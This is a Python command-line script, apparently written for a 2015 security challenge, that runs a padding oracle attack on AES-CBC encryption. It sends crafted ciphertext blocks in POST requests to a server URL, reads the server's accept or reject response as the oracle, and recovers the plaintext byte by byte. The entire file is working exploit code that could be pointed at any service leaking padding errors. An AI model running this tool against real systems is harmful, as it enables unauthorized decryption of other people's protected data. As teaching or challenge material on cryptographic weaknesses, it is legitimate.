#!/usr/bin/env python3

'''
Padding oracle exploit challenge attack.
Copyright (C) 2015  David Szakallas <david.szakallas(at)gmail.com>

This program is free software; you can redistribute it and/or
modify it under the terms of the GNU General Public License
as published by the Free Software Foundation; either version 2
of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program; if not, write to the Free Software
Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.
'''

__author__ = 'david'

import argparse, sys
from os import urandom
from functools import reduce
from urllib import request, error
from base64 import b64decode, b64encode

######################################################
# OVERWRITE THESE TO WORK WITH A DUMMY SERVER, ETC.


class OracleClient:
    def __init__(self, url):
        self.url = url

    def test(self, data):
        """
        Encodes and sends data to the oracle listening on the given URL
        :param self: this object
        :param data: data that should be sent
        :return: True if server accepted, False if server not accepted. Other exceptions are logged.
        """
        try:
            request.urlopen(request.Request(
                url=self. url,
                data=b64encode(data),
                headers={"Content-Type": "text/plain;charset=utf-8"},
                method='POST'))
            return True

        except error.HTTPError as e:
            if e.code != 403:
                print("WARNING: Server returned %s. Something isn't right" % e.code, file=sys.stderr)
            return False


def main():
    parser = argparse.ArgumentParser(description="Exploit the padding oracle")
    parser.add_argument('message', type=str,   action='store', help="should be in base64 encoding")
    parser.add_argument('url',     type=str,   action='store', help="URL, e.g. 'http://127.0.0.1:12345/'")

    args = parser.parse_args(sys.argv[1:])

    mess = b64decode(args.message)

    client = OracleClient(args.url)

    blocks = [decrypt_block(mess[i:i+16], client.test) for i in range(0, mess.__len__(), 16)]
    preceding_ct = [b"\x00" * 16] + [mess[i:i+16] for i in range(0, mess.__len__() - 16, 16)]
    text = reduce(lambda x, y: x+y, [xor(x[0], x[1]) for x in zip(blocks, preceding_ct)], b'')
    print(text)

######################################################


def xor(a, b):
    """
    Bitwise XOR of the bytearrays. They must be of the same length (not checked).
    :param a: bytearray
    :param b: bytearray
    :return: bitwise XOR of a and b
    """
    return bytearray([x[0] ^ x[1] for x in zip(a, b)])


def inc(a):
    """
    Adds 1 to the bytearray as if it were a big endian unsigned number
    :param a: bytearray to be incremented
    :return: the incremented bytearray
    """
    bs = [b for b in a]
    i = bs.__len__()
    while i:
        i -= 1
        bs[i] = (bs[i] + 1) % 256
        if bs[i]:
            break
    return bytearray(bs)


def tweak(a, n):
    """
    Manipulates the bytearray a, so its n-th byte (starting from 0) becomes different.
    :param a: bytearray to be manipulated
    :param n: index of the byte to be changed
    :return: a modified bytearray
    """
    bs = [b for b in a]
    bs[n] = (bs[n] + 1) % 256
    return bytearray(bs)


def decrypt_block(block, tester):
    """
    (Almost) Decrypts a 16 byte CBC chained block. The block needs to be
    XORed with the preceding one to get its plaintext.
    :param block: the 16 byte block to decrypt
    :param tester: a function that tests the input and returns a boolean
    :return: partially decrypted block
    """
    random = bytearray(urandom(16))
    i = b'\x00' * 16
    test = xor(random, i)

    while tester(test + block) is False:
        i = inc(i)
        test = xor(random, i)

    j = 1

    tweaked = tweak(test[:], j-1)

    while tester(tweaked + block) is True:
        j += 1
        tweaked = tweak(tweaked, j-1)

    l = 17 - j
    known = bytearray([b ^ l for b in test[-l:]])[::-1]

    while l != 16:
        random = bytearray(urandom(16 - l))
        i = b'\x00' * (16 - l)
        pad = xor(bytearray([l + 1]) * l, known)

        head = xor(random, i)

        while tester(head + pad + block) is False:
            i = inc(i)
            head = xor(random, i)

        known = bytearray([head[-1] ^ (l+1)]) + known
        l += 1

    return known


if __name__ == '__main__':
    main()
